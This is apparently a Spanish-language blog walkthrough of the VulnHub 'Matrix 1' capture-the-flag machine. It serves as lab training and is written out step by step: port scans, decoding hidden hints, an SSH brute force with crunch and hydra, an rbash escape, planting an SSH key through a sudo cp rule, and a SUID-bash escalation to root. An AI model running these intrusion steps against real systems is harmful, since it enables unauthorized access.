---
layout: single
title: Matrix 1 - VulnHub
excerpt: " Difficulty: Intermediate Flags: Your Goal is to get root and read /root/flag.txt"
date: 2023-04-11
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-matrix/matrix.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - Criptography
  - Decoding
  - Bruteforce
  - Hydra
  - Crunch
  - SSH
---

Difficulty: Intermediate
Flags: Your Goal is to get root and read /root/flag.txt

# Summary
- IP: 192.168.1.54
- Ports: 22,80,31337
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.7
	-  80 -> SimpleHTTPServer 0.6 (Python 2.7.14)
	-  31337 -> SimpleHTTPServer 0.6 (Python 2.7.14)

# Recon

- Escaneo básico de puertos:

```
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.54 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```
$sudo nmap -p21,80,2222,31337 -sCV 192.168.1.54 -oN targeted
```

<br><br>


# Análisis de página web (Port 80):

- Al entrar a la página principal podemos observar un texto que dice "Follow the White Rabbit", y si nos fijamos bien, hay la imagen de un conejo blanco muy pequeña incrustada en la página, si revisamos el código fuente, podemos encontrar la ubicación y el nombre de esta imagen, el cual es `"p0rt_31337.png"`.

- Usamos el nombre de la imagen que encontramos como una `pista`, así que abrimos la página pero ahora usando el puerto 31337.

<br><br>
# Análisis de página web (Port 31337):


- Al abrir la página principal no encontramos nada interesante a simple vista, sin embargo, si revisamos su código fuente podemos encontrar la siguiente linea comentada:

```js
<!--p class="service__text">ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</p-->
```


- Parece ser texto codificado en base64, así que lo `decodeamos` para averiguar su contenido:

```bash
$echo -n "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" | base64 -d; echo
```

```js
"Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
```

<br><br>


# Resolución de reto de Criptografía:

- Sospechamos de la existencia de un posible recurso `"cypher.matrix"` dentro del sistema víctima, primero probamos buscando usando la URL:

```
http://192.168.1.54:31337/Cypher.matrix
```

- Y vemos como se nos descarga este archivo, confirmando así su existencia.

- Ahora analizamos el archivo que hemos descargado:

```bash
$cat Cypher.matrix
```

- Y como podemos apreciar, se nos despliegan un montón de símbolos "+" "-" y otros cuantos más, sin ninguna palabra legible.

- Si investigamos, nos daremos cuenta que se trata de un lenguaje de programación esotérico denominado `"Brainfuck"`; así que podemos buscar una herramienta en linea que nos permita compilar dicho código para saber qué es lo que hace; específicamente se usó la siguiente herramienta: [Online Brainfuck Compiler](https://www.tutorialspoint.com/execute_brainfk_online.php)

- Al copiar el código y compilarlo nos despliega el siguiente contenido:

```js
You can enter intomatrix as guest, with password k1ll0rXX
Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
```

<br><br>
# Creación de diccionario personalizado para Fuerza Bruta:

- Como podemos apreciar, el contenido del contenido oculto detrás del código Brainfuck nos dice que podemos acceder a la Matrix como el usuario `"guest"` usando la contrseña "k1ll0rXX", siendo los dos últimos caracteres desconocidos, por lo que tendremos que averiguarlos de alguna forma.

- Sabemos que el puerto 22 está abierto, así que podríamos acceder al sistema mediante el protocolo SSH, pero antes debemos averiguar la `contraseña` correcta.

- Si analizamos la contraseña que nos dan, vemos que hay números y letras en minúsculas, por lo que podríamos crear un diccionario que contemple la contraseña sustituyendo los dos últimos caracteres con todas las posibilidades que hay usando números y letras en minúsculas, esto con el fin de usar el diccionario creado para realizar un ataque de `fuerza bruta` contra el protocolo SSH con Hydra y poder confirmar la contraseña legítima.

- Para la creación del diccionario personalizado utilizamos la herramienta `"crunch"`.

```bash
$crunch 8 8 -t k1ll0r%@ >diccionario
```

- Con esto, creamos un diccionario que contemple en donde está el "%" todas las combinaciones de números, mientras que donde está el "@" se contemplan todas las combinaciones de letras en minúsculas, dando un total de 260 palabras almacenándolas en el archivo "diccionario".

```bash
$crunch 8 8 -t k1ll0r@% >> diccionario
```

- Con esto hacemos el proceso inverso a lo anterior, contemplando ahora los números después de las letras, añadiendo 260 palabras más al archivo "diccionario".

- Con este diccionario ya creado procedemos a realizar el ataque de fuerza bruta:

```bash
$hydra -l guest -P diccionario ssh://192.168.1.54 -t 20
```

```js
[DATA] attacking ssh://192.168.1.54:22/
[22][ssh] host: 192.168.1.54   login: guest   password: k1ll0r7n
```

- Obtenemos la contraseña del usuario "guest" accediendo así al sistema víctima... Sin embargo al intentar ejecutar comandos podemos darnos cuenta que nos encontramos en una `bash restingida` (rbash), lo que nos impide movernos con total libertad como lo haríamos en una bash normal, para "bypassear" esto simplemente podemos ordenarle al sistema que nos despliegue una "bash" justo antes de establecer la conexión por ssh, simplemente añadiendo la palabra "bash" al final del comando ssh:

```bash
$ssh guest@192.168.1.54 bash
```

- Con esto ahora sí estaremos en una bash y solo restaría hacer su respectivo tratamiento para mayor comodidad.
<br><br>
# ESCALANDO PRIVILEGIOS:

- Si revisamos permisos de sudoers podemos encontrar lo siguiente:

```bash
$sudo -l
```

```js
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

- Es decir, podemos ejecutar el binario "cp" como el usuario "trinity" sin usar contraseña.

- Como sabemos el binario "cp" se encarga de copiar cualquier tipo de fichero o directorio, así que en este caso, podemos aprovecharlo para copar una `key pública SSH` generada por el usuario "guest" dentro de la carpeta ".ssh" del directorio del usuario "trinity" con el nombre de "authorized_keys" para que podamos acceder por SSH como el usuario "trinity" sin proporcionar contraseña.

- Primero generamos la key pública:

```bash
$ssh-keygen
```

```js
Generating public/private rsa key pair.
Enter file in which to save the key (/home/guest/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/guest/.ssh/id_rsa.
Your public key has been saved in /home/guest/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:aC5RW8CS4VDSq7P/9DBTEJ5Jlumba6sbLnhqtrukUWM guest@porteus
The key's randomart image is:
+---[RSA 2048]----+
|  ooo+=o         |
|   ++++=         |
|    .+* .        |
|    ...=         |
|  E.. +oS        |
| oo. +o.         |
|.o oo *.         |
|+++. +o=         |
|=*+o==o..        |
+----[SHA256]-----+
```


- Ahora copiamos la key pública generada dentro del directorio "/tmp" del sistema ya que el usuario "trinity" no tendría los permisos para manipular el archivo dentro del directorio del usuario "guest":

```bash
$cp /home/guest/.ssh/id_rsa.pub /tmp/id_rsa.pub
```

- Y ahora usamos el privilegio de sudoer para copiar este archivo como el usuario "trinity" dentro de su directorio ".ssh" con el nombre de `"authorized_keys"`:

```bash
$sudo -u trinity /bin/cp /tmp/id_rsa.pub /home/trinity/.ssh/authorized_keys
```

- Ahora solo resta `pivotar` al usuario trinity:

```bash
$ssh trinity@127.0.0.1
```


- Revisamos los permisos de `sudoers` como el usuario "trinity" y vemos lo siguiente:

```bash
$sudo -l
```

```js
User trinity may run the following commands on porteus:
    (root) NOPASSWD: /home/trinity/oracle
```

- Como podemos apreciar, podemos ejecutar el archivo "oracle" como el usuario "root" sin usar contraseña; si revisamos bien, podemos darnos cuenta que dicho archivo `no existe`, y como el directorio es el nuestro "trinity" tenemos `capacidad de escritura`, así que podemos simplemente aprovechar esto para crear un archivo "oracle" que tenga como contenido el comando en bash que otorgue permisos SUID a la bash.

```bash
$echo "chmod u+s /bin/bash" > oracle
$chmod +x oracle
```

- Y ejecutamos el archivo "oracle" como root:

```bash
$sudo /home/trinity/oracle 
```

- Y finalmente ejecutamos la bash con privilegios y seremos `root`.

```bash
$bash -p
```
